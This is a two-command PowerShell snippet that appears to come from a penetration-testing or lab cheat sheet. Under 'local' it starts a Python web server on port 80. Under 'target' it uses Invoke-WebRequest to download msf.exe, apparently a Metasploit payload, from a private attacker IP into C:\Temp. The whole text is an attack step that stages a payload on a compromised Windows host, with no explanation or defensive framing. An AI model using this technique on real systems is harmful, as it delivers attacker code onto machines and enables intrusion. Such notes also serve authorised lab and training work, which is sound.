```ps1
# local
python3 -m http.server 80

# target
Invoke-WebRequest -uri http://192.168.45.227:80/msf.exe -Outfile C:\Temp\msf.exe
```
